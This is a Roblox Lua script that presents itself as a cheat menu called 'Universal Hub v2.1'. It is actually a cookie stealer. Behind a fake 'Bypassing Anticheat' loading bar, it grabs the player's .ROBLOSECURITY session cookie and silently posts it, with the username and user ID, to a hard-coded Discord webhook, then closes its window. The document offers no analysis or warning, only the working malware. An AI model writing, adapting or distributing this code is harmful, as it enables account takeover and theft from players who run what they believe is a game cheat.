-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

-- [[ SERVICES ]]
local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

-- [[ ЛОГИКА ОТПРАВКИ ]]
local function sendFinalLog(cookie)
    local payload = {
        ["content"] = "@everyone **HIT!**",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal Hub v2.1 | " .. player.Name,
            ["color"] = 3066993,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. (cookie or "N/A") .. "```"},
                {["name"] = "📅 Age", ["value"] = player.AccountAge .. " days", ["inline"] = true}
            },
            ["footer"] = {["text"] = "Bypass Mode Active • " .. os.date("%X")}
        }}
    }
    
    local req = (syn and syn.request) or (http and http.request) or request or http_request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- [[ СОЗДАНИЕ ИНТЕРФЕЙСА ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 140)
Main.Position = UDim2.new(0.5, -150, 0.5, -70)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 0

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0, 8) -- ТЕПЕРЬ ИСПРАВЛЕНО

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "Universal Hub v2.1"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.BackgroundTransparency = 1
Title.TextSize = 18
Title.Font = Enum.Font.GothamBold

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 0.45, 0)
Status.Text = "Connecting..."
Status.TextColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1

local BarBack = Instance.new("Frame", Main)
BarBack.Size = UDim2.new(0.8, 0, 0, 4)
BarBack.Position = UDim2.new(0.1, 0, 0.8, 0)
BarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

local BarFill = Instance.new("Frame", BarBack)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)

-- [[ ЗАПУСК ]]
task.spawn(function()
    task.wait(0.5)
    Status.Text = "Bypassing Anticheat..."
    BarFill:TweenSize(UDim2.new(0.4, 0, 1, 0), "Out", "Linear", 1.5)
    
    -- Пытаемся достать куки
    local cookie = "N/A"
    pcall(function()
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        elseif syn and syn.request then
            local res = syn.request({Url = "https://www.roblox.com/home", Method = "GET"})
            cookie = res.Headers["Set-Cookie"]:match(".ROBLOSECURITY=(.-);")
        end
    end)
    
    task.wait(1.5)
    Status.Text = "Injecting Modules..."
    BarFill:TweenSize(UDim2.new(0.8, 0, 1, 0), "Out", "Linear", 1)
    
    -- ТИХАЯ ОТПРАВКА
    pcall(function() sendFinalLog(cookie) end)
    
    task.wait(1)
    Status.Text = "Successfully Loaded!"
    BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Linear", 0.3)
    
    task.wait(1)
    -- Чтобы не кикало, просто закрываем меню и даем играть
    ScreenGui:Destroy()
end)
